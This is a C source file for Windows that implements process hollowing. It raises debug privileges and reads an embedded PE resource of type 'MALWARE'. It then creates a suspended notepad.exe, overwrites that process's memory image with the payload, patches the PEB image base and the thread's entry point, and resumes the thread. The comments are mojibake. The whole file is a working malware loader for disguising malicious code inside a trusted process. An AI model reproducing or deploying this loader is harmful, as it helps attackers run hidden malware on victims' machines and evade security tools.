#include <windows.h>
#include <tchar.h>



//ring3����Ȩ����
BOOL enableDebugPriv()
{
	HANDLE  hToken;
	LUID    sedebugnameValue;
	TOKEN_PRIVILEGES tkp;
	if (!OpenProcessToken(GetCurrentProcess(),
		TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)
		)
	{
		return false;
	}
	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue))
	{
		CloseHandle(hToken);
		return false;
	}
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Luid = sedebugnameValue;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL))
	{
		CloseHandle(hToken);
		return false;
	}
	return true;
}
//������Դ�����ص�PE�ļ�
LPVOID LoadRes(HMODULE hModule)
{
	HRSRC hResInfo;
	HGLOBAL hResData;
	LPVOID lpResLock;
	DWORD dwSize;
	LPVOID lpAddr;

	if (hModule == NULL)
	{
		return NULL;
	}

	hResInfo = FindResource(hModule, MAKEINTRESOURCE(101), _T("MALWARE"));
	if (hResInfo == NULL)
	{
		return NULL;
	}

	hResData = LoadResource(hModule, hResInfo);
	if (hResData == NULL)
	{
		return NULL;
	}

	lpResLock = LockResource(hResData);
	if (lpResLock == NULL)
	{
		return NULL;
	}

	dwSize = SizeofResource(hModule, hResInfo);
	if (dwSize == 0)
	{
		return NULL;
	}

	lpAddr = VirtualAlloc(0, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (lpAddr == NULL)
	{
		return NULL;
	}
	memcpy(lpAddr, lpResLock, dwSize);

	return lpAddr;
}

int main(int argc, const char **argv, const char **envp)
{
	enableDebugPriv();
	HMODULE hModule = GetModuleHandle(NULL);
	//��Ҫ�������̵�����·��
	TCHAR cAppName[MAX_PATH] = _T("C:\\Windows\\System32\\notepad.exe");
	//PE��ز���
	PIMAGE_DOS_HEADER pDosHeader;
	PIMAGE_NT_HEADERS pNtHeaders;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	LPVOID lpMalwareBaseAddr;
	DWORD dwVictimBaseAddr;
	LPVOID lpNewVictimBaseAddr;
	CONTEXT context;
	DWORD idx;
	//��ȡ���ض����ļ��Ļ�ַ
	lpMalwareBaseAddr = LoadRes(hModule);
	if (lpMalwareBaseAddr == NULL)
	{
		return -1;
	}

	//�������ļ���DOSͷ
	pDosHeader = (PIMAGE_DOS_HEADER)lpMalwareBaseAddr;
	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
	{
		return -1;
	}

	//�������ļ���PEͷ��ȷ�������ص���Դ�Ƿ�ΪPE�ļ�
	pNtHeaders = (PIMAGE_NT_HEADERS)((DWORD)lpMalwareBaseAddr + pDosHeader->e_lfanew);
	if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE )
	{
		return -1;
	}

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	//����һ������Ľ���
	if (CreateProcess(cAppName, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED,	NULL, NULL,	&si, &pi) == 0)
	{
		return -1;
	}
	//��ȡ�������������
	context.ContextFlags = CONTEXT_FULL;
	if (GetThreadContext(pi.hThread, &context) == 0)
	{
		return -1;
	}

	//ebxָ��PEB�����̻����飩��ebx+8ָ���PE�ļ��ļ��ػ�ַ
	if (ReadProcessMemory(pi.hProcess, (LPCVOID)(context.Ebx + 8), &dwVictimBaseAddr, sizeof(PVOID), NULL) == 0)
	{
		return -1;
	}
	//����Ϊ�����������ڴ�ռ�
	lpNewVictimBaseAddr = VirtualAllocEx(pi.hProcess,
							(LPVOID)pNtHeaders->OptionalHeader.ImageBase,
							pNtHeaders->OptionalHeader.SizeOfImage,
							MEM_COMMIT | MEM_RESERVE,
							PAGE_EXECUTE_READWRITE);
	if (lpNewVictimBaseAddr == NULL)
	{
		return -1;
	}

	// �ö�������PEͷ�����������̵�PEͷ
	WriteProcessMemory(pi.hProcess, lpNewVictimBaseAddr, lpMalwareBaseAddr, pNtHeaders->OptionalHeader.SizeOfHeaders, NULL);

	// �滻����
	LPVOID lpSectionBaseAddr = (LPVOID)((DWORD)lpMalwareBaseAddr + pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS));
	PIMAGE_SECTION_HEADER pSectionHeader;
	for (idx = 0; idx < pNtHeaders->FileHeader.NumberOfSections; ++idx)
	{
		pSectionHeader = (PIMAGE_SECTION_HEADER)lpSectionBaseAddr;
		WriteProcessMemory(pi.hProcess,
			(LPVOID)((DWORD)lpNewVictimBaseAddr + pSectionHeader->VirtualAddress),
			(LPCVOID)((DWORD)lpMalwareBaseAddr + pSectionHeader->PointerToRawData),
			pSectionHeader->SizeOfRawData,
			NULL);
		lpSectionBaseAddr = (LPVOID)((DWORD)lpSectionBaseAddr + sizeof(IMAGE_SECTION_HEADER));
	}

	// �滻PEBƫ��8�ļ��ػ�ַ
	DWORD dwImageBase = pNtHeaders->OptionalHeader.ImageBase;
	WriteProcessMemory(pi.hProcess, (LPVOID)(context.Ebx + 8), (LPCVOID)&dwImageBase, sizeof(PVOID), NULL);

	//�滻OEP
	context.Eax = dwImageBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint;
	SetThreadContext(pi.hThread, &context);
	ResumeThread(pi.hThread);

	return 0;
}